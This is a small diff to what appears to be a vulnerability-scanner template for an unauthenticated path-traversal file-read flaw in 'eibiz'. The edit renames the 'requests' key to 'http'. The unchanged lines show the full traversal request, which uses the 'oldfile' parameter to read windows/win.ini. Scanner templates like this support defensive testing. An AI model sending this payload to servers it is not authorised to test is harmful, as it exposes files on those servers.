@@ -7,7 +7,7 @@ info:
   description: An unauthenticated remote attacker can exploit this to view the contents of files located outside of the server's root directory. The issue can be triggered through the oldfile GET parameter.
   tags: windows,lfi,eibiz
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/dlibrary/null?oldfile=../../../../../../windows/win.ini&library=null"
